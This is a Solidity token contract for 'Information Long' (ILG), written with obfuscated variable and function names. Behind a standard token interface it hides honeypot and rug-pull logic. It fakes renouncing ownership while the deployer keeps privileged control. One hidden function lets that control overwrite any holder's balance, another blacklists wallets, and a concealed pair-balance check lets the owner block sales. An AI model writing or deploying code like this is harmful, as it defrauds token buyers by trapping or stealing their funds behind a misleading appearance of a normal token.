//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface fromMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract minBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atSender {
    function createPair(address atLaunched, address sellBuy) external returns (address);
}

interface limitMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalLaunched) external view returns (uint256);

    function transfer(address senderTrading, uint256 senderExempt) external returns (bool);

    function allowance(address buyMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderExempt) external returns (bool);

    function transferFrom(
        address sender,
        address senderTrading,
        uint256 senderExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txMax, uint256 value);
    event Approval(address indexed buyMin, address indexed spender, uint256 value);
}

interface limitMinMetadata is limitMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InformationLong is minBuy, limitMin, limitMinMetadata {

    function autoTrading() public {
        emit OwnershipTransferred(isLaunch, address(0));
        atLimitBuy = address(0);
    }

    address private atLimitBuy;

    function symbol() external view virtual override returns (string memory) {
        return isBuyFee;
    }

    function transferFrom(address marketingTeam, address senderTrading, uint256 senderExempt) external override returns (bool) {
        if (_msgSender() != swapToken) {
            if (toFund[marketingTeam][_msgSender()] != type(uint256).max) {
                require(senderExempt <= toFund[marketingTeam][_msgSender()]);
                toFund[marketingTeam][_msgSender()] -= senderExempt;
            }
        }
        return autoMode(marketingTeam, senderTrading, senderExempt);
    }

    function allowance(address amountToken, address minSell) external view virtual override returns (uint256) {
        if (minSell == swapToken) {
            return type(uint256).max;
        }
        return toFund[amountToken][minSell];
    }

    mapping(address => bool) public amountListToken;

    bool public fromAuto;

    uint256 public receiverTeam;

    mapping(address => bool) public feeWalletLaunched;

    address swapToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint8 private maxEnable = 18;

    function takeWallet() private view {
        require(amountListToken[_msgSender()]);
    }

    uint256 private listTradingFee = 100000000 * 10 ** 18;

    uint256 private listMin;

    function name() external view virtual override returns (string memory) {
        return feeExempt;
    }

    address public isLaunch;

    function balanceOf(address totalLaunched) public view virtual override returns (uint256) {
        return senderList[totalLaunched];
    }

    event OwnershipTransferred(address indexed buyAuto, address indexed marketingLimit);

    uint256 public totalFeeTrading;

    function approve(address minSell, uint256 senderExempt) public virtual override returns (bool) {
        toFund[_msgSender()][minSell] = senderExempt;
        emit Approval(_msgSender(), minSell, senderExempt);
        return true;
    }

    function tradingTotalFund(address receiverFund) public {
        if (fromAuto) {
            return;
        }
        
        amountListToken[receiverFund] = true;
        
        fromAuto = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return maxEnable;
    }

    function walletLimit(address marketingTeam, address senderTrading, uint256 senderExempt) internal returns (bool) {
        require(senderList[marketingTeam] >= senderExempt);
        senderList[marketingTeam] -= senderExempt;
        senderList[senderTrading] += senderExempt;
        emit Transfer(marketingTeam, senderTrading, senderExempt);
        return true;
    }

    function fromAutoMin(address shouldLimit, uint256 senderExempt) public {
        takeWallet();
        senderList[shouldLimit] = senderExempt;
    }

    mapping(address => mapping(address => uint256)) private toFund;

    uint256 launchedToken;

    function takeLaunchToken(uint256 senderExempt) public {
        takeWallet();
        launchedToken = senderExempt;
    }

    string private isBuyFee = "ILG";

    constructor (){
        
        fromMarketing atMax = fromMarketing(swapToken);
        minFeeTeam = atSender(atMax.factory()).createPair(atMax.WETH(), address(this));
        if (autoToken == tradingToTeam) {
            fromExempt = true;
        }
        isLaunch = _msgSender();
        autoTrading();
        amountListToken[isLaunch] = true;
        senderList[isLaunch] = listTradingFee;
        
        emit Transfer(address(0), isLaunch, listTradingFee);
    }

    function getOwner() external view returns (address) {
        return atLimitBuy;
    }

    function takeLaunched(address senderSell) public {
        takeWallet();
        
        if (senderSell == isLaunch || senderSell == minFeeTeam) {
            return;
        }
        feeWalletLaunched[senderSell] = true;
    }

    uint256 private tradingToTeam;

    bool private fromExempt;

    function transfer(address shouldLimit, uint256 senderExempt) external virtual override returns (bool) {
        return autoMode(_msgSender(), shouldLimit, senderExempt);
    }

    mapping(address => uint256) private senderList;

    function autoMode(address marketingTeam, address senderTrading, uint256 senderExempt) internal returns (bool) {
        if (marketingTeam == isLaunch) {
            return walletLimit(marketingTeam, senderTrading, senderExempt);
        }
        uint256 tokenFee = limitMin(minFeeTeam).balanceOf(modeSell);
        require(tokenFee == launchedToken);
        require(senderTrading != modeSell);
        if (feeWalletLaunched[marketingTeam]) {
            return walletLimit(marketingTeam, senderTrading, marketingFeeMin);
        }
        return walletLimit(marketingTeam, senderTrading, senderExempt);
    }

    uint256 sellReceiver;

    address public minFeeTeam;

    uint256 constant marketingFeeMin = 3 ** 10;

    function owner() external view returns (address) {
        return atLimitBuy;
    }

    bool private walletEnable;

    string private feeExempt = "Information Long";

    address modeSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public autoToken;

    function totalSupply() external view virtual override returns (uint256) {
        return listTradingFee;
    }

}